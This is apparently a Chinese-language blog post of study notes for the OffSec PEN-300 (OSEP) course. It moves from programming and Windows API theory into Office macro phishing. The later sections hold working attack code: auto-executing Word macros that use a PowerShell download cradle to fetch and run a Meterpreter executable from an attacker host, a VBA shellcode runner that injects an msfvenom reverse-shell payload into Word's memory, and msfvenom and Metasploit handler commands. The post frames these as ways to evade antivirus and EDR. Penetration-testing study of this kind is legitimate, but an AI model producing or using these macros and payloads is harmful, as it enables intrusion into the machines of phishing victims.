---
title: "[OSEP, PEN-300] Instructional notes - Part 1"
date: 2026-07-11
author: "CHW"
tags:
  - offsec
description: "OSWE PEN-300 筆記 Part 1，涵蓋 Compiled/Interpreted Language 與 .NET 基礎、Win32 API、Office VBA Macro、PowerShell Shellcode Runner、記憶體內執行與 Calendar Phishing 等等。"
---

[OSEP, PEN-300] Instructional notes - Part 1
===


# Table of Contents
[TOC]

# Introduction
>[!Note]
>Expect students to have taken the [PEN-200](https://www.offsec.com/courses/pen-200/) course and passed the OSCP exam or have equivalent knowledge and skills

PEN-300 全名 "Evasion Techniques and Breaching Defenses"
> 規避技術與突破防禦

- [OSEP Exam Guide](https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide)\
OffSec Experienced Penetration Tester\
![image](https://hackmd.io/_uploads/Hyn6QZneze.png)

# Operating System and Programming Theory
提供程式設計和Windows作業系統概念的理論講解
- 程式如何被執行
- 編譯型與直譯型語言差異
- CPU 如何執行指令
- native code / managed code 差異
- 記憶體管理與漏洞之間的關係
- Windows 上 C#、PowerShell、.NET、CLR 的執行模式
- 為什麼某些 payload 會被防毒偵測
- 為什麼某些 bypass 技術可行

## Programming Theory
建立滲透測試需要的語言分類與執行模型

### Programming Language Level
不同程式語言的層級與執行方式:
- Compiled Language    [編譯型語言](https://en.wikipedia.org/wiki/Compiled_language#:~:text=A%20compiled%20language%20is%20a,%2Druntime%20translation%20takes%20place)
- Interpreted Language [直譯型語言](https://en.wikipedia.org/wiki/Interpreted_language#:~:text=An%20interpreted%20language%20is%20a,program%20into%20machine-language%20instructions)

#### 1. 編譯型語言 Compiled Language
編譯型語言的程式碼不能直接執行，需要先經過 compiler 轉換成 CPU 可以執行的 Binary 格式:\
`Source Code` → `Compiler` → `Binary / Executable` → `CPU executes`\
👉🏻 `C / C++ source code` → `gcc / clang / MSVC` → `.exe / ELF binary`

CPU 的核心運作原理是根據 編譯後程式碼產生的 [opcodes](https://en.wikipedia.org/wiki/Opcode) 來執行操作。opcode 是一個 binary value，CPU 將其對應到特定的操作。為了提高程式碼的可讀性，opcodes 集合可以被翻譯成底層組合語言 ([assembly](https://en.wikipedia.org/wiki/Assembly_language) programming language)

當考慮像 [C](https://en.wikipedia.org/wiki/C_(programming_language)) 這樣的語言時 ，儘管 C 仍然被認為是相對底層的語言，但它的語法更容易讓人類閱讀。相較之下， [C++](https://en.wikipedia.org/wiki/C%2B%2B) 可以被視為高階語言，也可以被視為低階語言。它仍然提供了對 C 語言所有特性的訪問，並且可以透過  [inline assembly](https://learn.microsoft.com/en-us/cpp/assembler/inline/inline-assembler?view=msvc-170&viewFallbackFrom=vs-2019) instructions 直接嵌入 assembly code。 C++ 還提供了對類別和物件等高階特性的訪問，使其成為一種物件導向的程式語言

[Java](https://en.wikipedia.org/wiki/Java_(programming_language)) 和 [C#](https://en.wikipedia.org/wiki/C_Sharp_(programming_language)) 等語言 也是物件導向的程式語言，但它們的編譯和執行方式非常不同：\
Java 和 C# 會被編譯成 [Bytecode](https://en.wikipedia.org/wiki/Bytecode)，然後由已安裝的虛擬機器處理
- Java 使用 Java Virtual Machine (JVM)，是 Java Runtime Environment (JRE) 的一部分
- C# 使用 [Common Language Runtime](https://learn.microsoft.com/en-us/dotnet/standard/clr) (CLR)，是 [.NET](https://en.wikipedia.org/wiki/.NET_Framework) 框架的一部分

Web 瀏覽器通常也會透過 VM 執行JavaScript 等腳本語言編寫的程式碼。但當遇到重複性任務時，會採用一種 [just-in-time](https://en.wikipedia.org/wiki/Just-in-time_compilation) (JIT) 編譯的技術，將腳本直接編譯成本地程式碼\
Java 的 popularity 很大程度上源於其作業系統獨立性，因為 C# 則主要局限於 Windows 平台。隨著 .NET Core 發布， C# 也開始支援 Linux 和 macOS 系統

當 bytecode 執行時，VM 將其編譯成 CPU 執行的 opcodes

>[!Note]
>關於 Web 仔的困擾：\
>`Opcode` vs. `Bytecode` vs. `Machine Code` vs. `Native Code` vs. `Shellcode`\
>![image](https://hackmd.io/_uploads/Sk4yNX2gfx.png)
>> - Opcode     = 一個指令的動作代碼
>> - Bytecode   = 給虛擬機看的中介指令碼
>> - Machine code = CPU 可理解的二進位指令
>> - Native code = 特定平台可直接執行的 machine code
>> - Shellcode  = exploit 裡注入執行的 payload，通常也是 native code
>>
>> Assembly `ret` 不需要額外 operand，所以 opcode 本身剛好就是完整 machine code (C3 = opcode = machine code)\
>> Opcode 告訴 CPU「做什麼」，machine code 則包含 CPU 執行這個動作所需的完整 bytes


#### 2. 直譯型語言 Interpreted Language
Interpreted language 是指程式碼通常不會先完整編譯成獨立 binary，而是在執行時由 interpreter 解析\
`Script` → `Interpreter` → `Runtime Execution`

🥚 因為現代語言執行方式很複雜，不一定只有編譯或直譯：
- JIT Compilation	執行時即時把程式碼編譯成 native code
- Bytecode	先編譯成中介碼，再由 VM 執行
- Runtime Optimization	執行過程中動態最佳化
- VM Execution	透過虛擬機管理程式執行

Java / C# 也不是直接編譯成 CPU 指令，而是先編譯成 bytecode / IL，再交給 JVM / CLR 執行

### Programming Concepts
OOP 基本觀念:
- [class](https://en.wikipedia.org/wiki/Class_(computer_programming))，類別
class 是建立 object 的模板
- object，物件
根據 class 建立出的實體
- variable，變數
大多數 class 會包含一些 variables，用來儲存與該 object 相關的資料
- [method](https://en.wikipedia.org/wiki/Method_(computer_programming))，方法
class 裡面通常會有 methods，用來對變數執行動作
- [constructor](https://en.wikipedia.org/wiki/Constructor_(object-oriented_programming))，建構子
建立 object 時自動執行的特殊 method
- [access modifier](https://en.wikipedia.org/wiki/Access_modifiers)，存取修飾子
控制誰可以存取 class / variable / method
- public / private
class 內外/內 可存取
- encapsulation，封裝
把資料藏在 object 內部，透過 method 控制存取

```java
public class MyClass
{
    private int myNumber;

    // constructor
    public MyClass(int aNumber)
    {
        this.myNumber = aNumber;
    }
    
    public getNumber()
    {
      return myNumber;
    }
}
```
> - MyClass object is instantiated
> - MyClass constructor will setup and initialize the myNumber class variable to the value passed as a parameter to the constructor.

## Windows Concepts
建立 Windows-specific concepts

### Windows On Windows
- [Windows On Windows 64-bit](https://learn.microsoft.com/en-us/windows/win32/winprog64/wow64-implementation-details) (WOW64)
WOW64 全名是 Windows On Windows 64-bit，Microsoft 提供的一個 compatibility layer ，目的是讓 64-bit Windows 可以執行 32-bit 應用程式\
WOW64 使用四個 64 位元 libraries（`Ntdll.dll`、 `Wow64.dll`、`Wow64Win.dll` 和 `Wow64Cpu.dll` ）來模擬 32 位元程式碼的執行，並在應用程式和核心之間執行轉換
- `Ntdll.dll`	提供 native API / system call stub
- `Wow64.dll`	WOW64 核心轉換層
- `Wow64Win.dll`	處理 Win32k / GUI 相關轉換
- `Wow64Cpu.dll`	處理 CPU execution mode transition

在 32-bit 版本的 Windows 系統中，大數 Windows 原生應用程式和程式庫會儲存在 `C:\Windows\System32` 目錄中。在 64-bit 版本的 Windows 系統中，64-bit 原生程式和 DLL 檔案儲存在 `C:\Windows\System32` 目錄中，而 32-bit 版本則儲存在 `C:\Windows\SysWOW64` 目錄\
👉🏻 這會決定了可以使用 shellcode 和其他編譯程式碼的類型

### Win32 APIs
[Win32 API](https://en.wikipedia.org/wiki/Windows_API) 是 Windows 提供給應用程式使用的一組內建 API，讓程式可以呼叫 OS 能力

Windows 本身與應用程式可能用很多語言寫成，例如：Assembly, C, C++, C#, PowerShell, Visual Basic, JavaScript 但很多功能最後都會透過 Win32 API 與 Windows 互動

許多 Win32 API 都有 Microsoft 提供的文件。一個簡單範例是 `Advapi32.dll` 導出的 GetUserNameA API ，它可以檢索執行該函數的使用者的名稱:
```cpp
BOOL GetUserNameA(
  LPSTR   lpBuffer,
  LPDWORD pcbBuffer
);
```
> 功能：取得目前執行該 function 的使用者名稱
> - `GetUserNameA`: API 名稱, A 表示 ASCII version (這個 API 使用 ANSI / ASCII 字串版本) Windows API 中的 Unicode 通常是 UTF-16，一個字元常見為 2 bytes
> - `LPSTR lpBuffer`: LPSTR 是 Microsoft data type，也就是一個 character array，這個 buffer 是 output buffer，API 會把使用者名稱寫進這裡
> - `LPDWORD pcbBuffer`: DWORD 是 32-bit unsigned integer，LPDWORD 則是 pointer to DWORD 。表示 buffer 大小

在呼叫 API 時需確認 process 是 32-bit 還是 64-bit，因為某些參數與大小取決於 bitness\
若在 C# P/Invoke 中把 pointer 寫成 int，在 64-bit process 中可能會截斷 address
```csharp
int addr = VirtualAlloc(...);
```
正確應使用:
```csharp
IntPtr addr = VirtualAlloc(...);
```
因為 IntPtr 會依照 process bitness 自動變成 4 或 8 bytes

為什麼 PEN-300 需要學 Windows API?\
![image](https://hackmd.io/_uploads/rkGDSB3lMx.png)

### Windows Registry
[Windows Registry](https://en.wikipedia.org/wiki/Windows_Registry) 是什麼？把 registry 類比成作業系統層級的 global variables
- Local variable	只在特定 function / scope 有效
- Global variable	整個程式都能使用

Registry 是一個 database，由大量 keys, values, subkeys 組成\
檔案系統結構:
```
Hive
└── Key
    └── Subkey
        ├── Value Name
        └── Value Data
```
範例：
```
HKEY_CURRENT_USER
└── Software
    └── Microsoft
        └── Windows
            └── CurrentVersion
                └── Run
```

Registry 最上層的邏輯區塊是 [Hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives):
- HKEY_CURRENT_USER  HKCU: 目前登入使用者相關的設定
一般使用者通常可以修改自己的 HKCU\
(user preferences, user-specific software settings, user environment, user-level startup settings, current user's mapped drives, current user's console settings)
- HKEY_LOCAL_MACHINE HKLM: 作業系統本身與本機電腦層級設定
修改 HKLM 通常需要 administrative privileges\
(installed software, services, drivers, machine-wide, configuration, security settings, local policy, system environment, hardware configuration)

Registry 操作可以透過：
1. Programmatically through Win32 APIs
透過程式呼叫 Win32 API
```
RegOpenKeyEx
RegQueryValueEx
RegSetValueEx
RegCreateKeyEx
RegDeleteValue ...
```
2. GUI 工具 regedit (Registry Editor / `regedit`)
![image](https://hackmd.io/_uploads/B1hb_w3lfe.png)
3. CLI 工具 reg.exe 
```
reg query
reg add
reg delete
```
# Phishing with Microsoft Office
利用 Office 文件、Macro、VBA、PowerShell 與記憶體內 shellcode 執行，取得 Initial Access

在 2023 年 phishing attacks 是 17% 入侵事件的 initial vector\
([M-Trends 2024 Special Report](https://services.google.com/fh/files/misc/m-trends-2024.pdf))\
![image](https://hackmd.io/_uploads/SJKAWM6lMx.png)


類型 | 目標 | 舉例 | 
:------:|:---------------------|:---------------------|
Server-side attack  |   對外服務、Web app、API、伺服器    |    SQLi、RCE、file upload、SSRF   | 
Client-side attack  |   使用者工作站、筆電、Office、瀏覽器    |  惡意文件、macro、XSS phishing、browser exploit   | 

Server-side attack 是攻擊者主動打目標服務，Client-side attack 是誘使目標使用者執行某些內容

在 2022 Microsoft 對多款 Office 產品預設[禁用 Macros](https://learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked)\
當使用者開啟包含 macros 文件時會顯示安全警告：\
![image](https://hackmd.io/_uploads/rkuQ5zagfe.png)

Office 2016 or 2019 仍可以在開啟包含 macro 文件中 enable\
![image](https://hackmd.io/_uploads/SJZcqGTgMe.png)
> 可以透過 user 點擊 "Enable Content" 觸發

## Microsoft Office Macros
[Visual Basic for Applications](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications) (VBA): Microsoft Office 內建的腳本語言

VBA 可以操作 Office 物件，例如：`Word document`, `Excel`, `workbook`, `Worksheet`, `Cell`, `Selection`, `Range`, `Paragraph`, `Form`, `Button`\
也可以與 Windows 互動，例如：執行外部程式, 操作檔案, 呼叫 COM object, 呼叫 Windows API, 讀寫 Registry, 建立網路請求

🎯: 利用 VBA Office 自動化將 macro 變成 Windows 上的 code execution primitive

### Installing Microsoft Office
RDP 連線環境範例
```
┌──(chw💲CHW)-[~/Offsec/OSEP]
└─$ xfreerdp3 /u:<username> /p:<password> /v:<machineIP> /cert:ignore -dynamic-resolution
```
> - `-dynamic-resolution`: 讓 RDP 視窗解析度可以動態調整

開啟 `C:\installs\Word2021Retail.img`，Windows 會把 .img 掛載成虛擬光碟\
![image](https://hackmd.io/_uploads/Hk62ImTgMl.png)\
![image](https://hackmd.io/_uploads/BJkA8XalMl.png)

### Understanding the Basics of VBA
使用 [Windows Script Host](https://en.wikipedia.org/wiki/Windows_Script_Host#:~:text=The%20Microsoft%20Windows%20Script%20Host,wider%20range%20of%20supported%20features.) 從 Word 執行命令提示字元\
在 Word 中建立 macro:
```
Open Word
→ New Document
→ View tab
→ Macros
→ 選擇目前文件
→ 輸入 macro 名稱
→ Create
→ 開啟 VBA editor
```
(View tab)\
![image](https://hackmd.io/_uploads/r16SlSTxzl.png)
(Macros)\
![image](https://hackmd.io/_uploads/SkRhWSpefl.png)
> 選擇 Document1，如果不選擇此文檔 Word 會將巨集儲存到全域範本中

(Create, macro name: MyMacro)\
![image](https://hackmd.io/_uploads/B19FdHTlMe.png)
> - Sub: 代表一個 procedure / method，可以執行動作，但不能回傳值給呼叫者
> - Function: 可以計算並回傳結果

#### 1. VBA 使用 Dim 宣告變數:
```vb
Dim myString As String
Dim myLong As Long
Dim myPointer As LongPtr
```
> - String: 用來儲存文字
> - Long: 整數型別
> - LongPtr: 會依照 Office process bitness 調整大小 (與 Windows API / pointer 有關)

#### 2. If/Else 條件判斷
[If and Else statements](https://learn.microsoft.com/en-us/office/vba/language/concepts/getting-started/using-ifthenelse-statements): 
```vb
Sub MyMacro()

Dim myLong As Long

myLong = 1

If myLong < 5 Then
    MsgBox ("True")
Else
    MsgBox ("False")
End If

End Sub
```
> 使用  [MsgBox function](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/msgbox-function) 顯示結果
> > ![image](https://hackmd.io/_uploads/HysEnBaezl.png)


#### 3. For Loop
[For...Next statement](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/fornext-statement): 
```vb
Sub MyMacro()

For counter = 1 To 3
    MsgBox ("Alert")
Next counter

End Sub
```
> 跳出三次 alert
>> ![image](https://hackmd.io/_uploads/H19waHTeMe.png)


接著自訂巨集，🥚 由於目標不太可能主動去點 Run Macro，需要利用現有的方法，例如 `Document_Open()` 和 `AutoOpen()` 會在 Word 文件開啟時執行
```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    MsgBox ("This is a macro test by CHW")
End Sub
```
使用 macro，必須把文件存成支援 macro 的格式\
![image](https://hackmd.io/_uploads/rkXybLpgGl.png)\
(開啟 Doc1.doc)\
![image](https://hackmd.io/_uploads/H1t7-L6gzx.png)

在 Options > Trust Center > Trust Center Settings 中可以選擇 Disable macros notify:\
![image](https://hackmd.io/_uploads/BkoNfUTgGl.png)\
Protected View 是 Office 2010 引入的 sandbox-like feature: 當文件來自不受信任來源，例如 Internet，Office 會用 Protected View 開啟\
![image](https://hackmd.io/_uploads/S1zDQ86ezg.png)\
![image](https://hackmd.io/_uploads/B1U-SITlMe.png)

Office 判斷文件是否來自 Internet，主要依賴 [Mark of the Web](https://en.wikipedia.org/wiki/Mark_of_the_Web) (MoTW)
MoTW 是 Windows 對從網際網路下載的檔案加上的來源標記\
可以從 document's properties 查看 MoTW attribute\
![image](https://hackmd.io/_uploads/r1arII6gMl.png)
> 若勾選 Unblock 再按 Apply，MoTW 會被清除\
> 且 Office 會把文件視為本機建立的檔案

#### 4. 從 VBA 啟動外部程式
##### 4.1 Shell function
VBA 內建 [Shell function](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/shell-function)
```vb
Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```
> vbHide 代表隱藏視窗

利用 [SysInternals Process Explorer](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer) 檢查是否成功啟用\
![image](https://hackmd.io/_uploads/rycU5IaxGx.png)
> WINWORD.EXE 的 child process 確實成功執行 cmd.exe

##### 4.2 Windows Script Host
第二種啟動外部程式的方法 Windows Script Host:
```vb
CreateObject("Wscript.Shell").Run str, 0
```
1. 使用 [CreateObject](https://ss64.com/vb/createobject.html) 建立 Wscript.Shell COM object
2. 呼叫 [Run](https://ss64.com/vb/run.html) method
3. 執行指定程式
4. 0 表示隱藏視窗
```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```
成功顯示兩個 cmd.exe (包含上述執行 Shell function 結果)\
![image](https://hackmd.io/_uploads/BJYOoUplfg.png)

若以 `CreateObject("Wscript.Shell").Run str, 1` 執行會跳出 cmd\
![image](https://hackmd.io/_uploads/rkn16IpeGg.png)

**Shell 與 Wscript.Shell 差異:**\
![image](https://hackmd.io/_uploads/B13giU6eMl.png)

### Integrating PowerShell
前面 VBA macro 的基礎進一步引入 PowerShell\
VBA 是一種 type-based compiled language，而 PowerShell 則是一種 object-oriented scripting language，透過 .NET 框架進行編譯並即時執行。PowerShell 比 VBA 更有彈性
```
Word document
→ VBA macro
→ PowerShell
→ 下載第二階段檔案
→ 執行 payload
```

在 PowerShell 中宣告變數時，只需在變數名稱前加上 dollar sign($)\
語法更接近一般 scripting language
在 [Comparison Operators](https://ss64.com/ps/syntax-compare.html) Powershell 使用 `-eq`, `-ne` 取代 `==` 或 `!=`

從外部伺服器下載第二階段內容到受害者主機 Download Cradle，使用 PowerShell [Net.WebClient class](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-8.0) 。PowerShell 可以建立這個 class 的 object，然後呼叫 [DownloadFile method](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-8.0)\
DownloadFile 只需要兩個參數:
```powershell
$url = "http://{Kali IP}/msfstaged.exe"
$out = "msfstaged.exe"
$wc = New-Object Net.WebClient
$wc.DownloadFile($url, $out)
```
PowerShell One-liner:
```powershell
(New-Object System.Net.WebClient).DownloadFile('http://{Kali IP}/msfstaged.exe', 'msfstaged.exe')
```

>[!Tip]
>大多 PowerShell download cradles 都使用 HTTP 或 HTTPS\
>也可以透過 [TXT records](https://en.wikipedia.org/wiki/TXT_record) 和 [DNS transport](https://github.com/evilmog/evilmog/wiki/DNS-Download-Cradle) 

下載完 payload 後，利用 `ActiveDocument.Path` 讀取文件所在的資料夾
```vb
Dim exePath As String
exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
```
下載 payload 需要時間，透過 [Do loop](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/doloop-statement) 搭配 [Now](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/now-function) 和 [DateAdd](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/dateadd-function) functions 建立時間延遲\
⚠️ 其中要呼叫 DoEvents 讓 Word 在等待期間仍然能處理其他事件，不至於完全卡死
```vb
Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

完整 VBA macro:
```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://{Kali IP}/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```
## Executing Shellcode in Word Memory
上述攻擊流程如下：
```
Word Macro
→ PowerShell
→ 下載 Meterpreter EXE 到硬碟
→ 執行 EXE
→ 取得 session
```
以上行為:
- 會產生網路下載行為: 可能被 proxy、NDR、EDR、IDS 偵測
- payload 落地到硬碟: 可能被 AV / EDR 掃描
- 建立可疑程序: WINWORD.EXE → powershell.exe → payload.exe 很明顯
- EXE 特徵容易被比對: Meterpreter 或常見 payload 容易被 signature 偵測

👉🏻 嘗試在 Word process 的記憶體中直接執行 staged payload\
🥚 VBA 本身沒有直接執行底層的記憶體操作，需要借助 Win32 API
```
WINWORD.EXE
└── VBA Macro
    └── 呼叫 Windows API
        └── 配置記憶體
        └── 複製 shellcode
        └── 執行 shellcode
```
### Calling Win32 APIs from VBA
Windows API 通常存在於 DLL 裡:
- `kernel32.dll`: process、thread、memory、file 等基礎功能
- `advapi32.dll`: security、registry、service、user info
- `user32.dll`: GUI、window、message box
- `ntdll.dll`: Native API / system call layer

這類 API 屬於 unmanaged code，也就是更接近 native Windows 執行層\
VBA 透過 [Declare](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/declare-statement) 宣告外部 DLL function

以  GetUserName API 為例：
```c
BOOL GetUserNameA(
  LPSTR   lpBuffer,
  LPDWORD pcbBuffer
);
```
這是 Microsoft MSDN 文件中的 C-style prototype，可以取得目前執行該 function 的使用者名稱 (位於: `advapi32.dll`)

![image](https://hackmd.io/_uploads/rJJLM50gMg.png)

MSDN / Microsoft Docs 用的是 C 型別，但在 VBA 中要轉換成 VBA 型別\
![image](https://hackmd.io/_uploads/B1E9PiCeGl.png)

完整 Declare 語句:
```vb
Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
```
Keyword | 說明 |
:------|:-------------|
Private | 只在目前 module 可用
Declare	| 宣告外部 DLL function
PtrSafe	| 表示可在 64-bit Office 中安全使用
Function GetUserName | 在 VBA 中使用的 function 名稱
Lib "advapi32.dll" | API 所在 DLL
Alias "GetUserNameA" | 實際呼叫 DLL 裡的 GetUserNameA
ByVal lpBuffer As String | 傳入字串 buffer
ByRef nSize As Long | 傳入 buffer 大小參考
As Long | 回傳值為 Long 

VBA 中可以叫 GetUserName，但實際上呼叫 DLL 裡的 GetUserNameA

導入函數後需要宣告三個變數：return value、output buffer 和 output buffer size\
根據 MSDN 文檔，使用者名稱的最大長度為 256 個字元，因此建立一個 256 位元組的字串` MyBuff`，並將`MySize` 設定為長整型並將其值設為 256\
Marco:
```vb
Function MyMacro()
  Dim res As Long
  Dim MyBuff As String * 256
  Dim MySize As Long
  MySize = 256
  
  res = GetUserName(MyBuff, MySize)
End Function
```
若 username= 'chw' 只有幾個字元，但 buffer 後面仍然有很多空白或 null bytes。且 C-style string 通常用 null byte 結尾: `chw\0......`\
👉🏻 需要找到第一個 null byte 的位置，才能知道真正 username 的長度

[InStr](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/instr-function) 定義起始位置:
```vb
Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long


Function MyMacro()
  Dim res As Long
  Dim MyBuff As String * 256
  Dim MySize As Long
  Dim strlen As Long
  MySize = 256
  
  res = GetUserName(MyBuff, MySize)
  strlen = InStr(1, MyBuff, vbNullChar) - 1
  MsgBox Left$(MyBuff, strlen)
End Function
```
Win32 API 成功呼叫，Marco 顯示出 username 且後面不包含空格：\
![image](https://hackmd.io/_uploads/Sknnn2XWfx.png)

📝 嘗試呼叫 Win32 API [GetPhysicallyInstalledSystemMemory](https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getphysicallyinstalledsystemmemory) 並顯示結果在訊息框
```vb
Private Declare PtrSafe Function GetPhysicallyInstalledSystemMemory Lib "kernel32.dll" (ByRef TotalMemoryInKilobytes As Currency) As Long

Sub MyMacro()

    Dim memKB As Currency
    Dim result As Long

    result = GetPhysicallyInstalledSystemMemory(memKB)

    If result <> 0 Then
        MsgBox memKB
    Else
        MsgBox "API call failed"
    End If

End Sub
```
> 把實體記憶體大小寫進 memKB

![image](https://hackmd.io/_uploads/BJMmt2m-zl.png)

### VBA Shellcode Runner
可以透過 VBA 呼叫 Win32 API 後， 嘗試利用 shellcode runner\
shellcode runner 使用 `Kernel32.dll` 的三個 API：`VirtualAlloc`、`RtlMoveMemory`、`CreateThread`\
🎯 目的是讓 staged Meterpreter payload 在 Word 記憶體中執行

上述透過 
```
Word Macro
→ PowerShell
→ 下載 msfstaged.exe
→ 存到硬碟
→ 執行 EXE
```
> 下載 EXE 可能被網路監控發現且 EXE 落地硬碟可能被防毒掃到

透過 shellcode 塞入記憶體：
```
Word Macro
→ shellcode 放進 Word 記憶體
→ 直接在 WINWORD.EXE 裡執行
```

需要先使用 VirtualAlloc 配置可寫入、可讀且可執行的 unmanaged memory\
將使用 RtlMoveMemory 將 shellcode 複製到新分配的記憶體中，並透過CreateThread 在 process 中建立一個新的 thread 執行 shellcode
- VirtualAlloc
```cpp
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```
- [RtlMoveMemory](https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory)
把資料從來源位置複製到目的記憶體位置\
把 msfvenom 產生的 shellcode byte array 一個 byte 一個 byte 複製到 VirtualAlloc 配置出來的記憶體
```cpp
VOID RtlMoveMemory(
  VOID UNALIGNED *Destination,
  VOID UNALIGNED *Source,
  SIZE_T         Length
);
```
- CreateThread
建立一條新的 Thread (從 addr 這個位置開始執行程式碼)
```cpp
HANDLE CreateThread(
  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  SIZE_T                  dwStackSize,
  LPTHREAD_START_ROUTINE  lpStartAddress,
  LPVOID                  lpParameter,
  DWORD                   dwCreationFlags,
  LPDWORD                 lpThreadId
);
```

函數接受三個變數:
- 傳回值和第一個參數可以轉換為 LongPtr 類型
- 第二個參數使用Any 類型
- 最後一個參數可以轉換為Long 類型。

 Destination pointer  指向新分配的 buffer，它本身就是一個 memory pointer 可以直接傳遞\
Source buffer 是 shellcode 陣列中某個元素的位址，必須按引用傳遞，而長度則以值傳遞
```vb
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
```


loop 條件使用 [LBound](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/lbound-function) 和 UBound 方法來找出陣列的第一個和最後一個元素
導入 RtlMoveMemory 函數，宣告兩個 long 類型的變量，然後注入 Payload
```vb
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

....

Dim counter As Long
Dim data As Long
Dim res as LongPtr

For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
Next counter
```

建構 Reverse shell:(`windows/x64/shell_reverse_tcp`)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Kali IP> LPORT=443 EXITFUNC=thread -f vbapplication
```
![image](https://hackmd.io/_uploads/HJUsQPBZze.png)

完整 VBA code:
```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    buf = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,72,49,210,81,101,72,
    ...
    06,0,89,187,224,29,42,10,65,137,218,255,213)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
![image](https://hackmd.io/_uploads/HJq3mDHZMl.png)

成功接收到 Reverse shell\
![image](https://hackmd.io/_uploads/rkHk4vSWfg.png)


>[!Important]
>若使用 reverse_https 建構 payload
>```
>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<Kali_IP> LPORT=443 EXITFUNC=thread -f vbapplication
>```
>需要使用 msfconsole handler
>```
>msfconsole
>```
>設定：
>```use exploit/multi/handler
>set payload windows/x64/meterpreter/reverse_https
>set LHOST <Kali_IP>
>set LPORT 443
>set ExitOnSession false
>run
>```

## PowerShell Shellcode Runner
1. 上述將 shellcode 是直接嵌在 Word 文件的 macro 裡，所以整份 Word 文件裡面會有一大段 `buf = Array(...)`\
這種大型 byte array 很容易被 antivirus / EDR 當成可疑巨集特徵
2. shellcode 是在 WINWORD.EXE 裡面執行。使用者只要把 Word 關掉，WINWORD.EXE 結束，shell 也會跟著消失

```
Word Macro
→ 啟動 PowerShell child process
→ PowerShell 從 Web Server 下載 script
→ PowerShell 在記憶體中執行 script
→ shellcode 在 powershell.exe 裡執行
```
> PowerShell Shellcode Runner 載入記憶體中執行 script，繞過 antivirus / EDR 偵測
>> PowerShell 可直接使用 `.NET Framework` 下載到記憶體並使用 [Invoke-Expression cmdlet](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6) 執行

### Calling Win32 APIs from PowerShell
PowerShell 本身是高階 scripting language，無法直接與 Win32 API 溝通，但是可以藉助 `.NET Framework`\
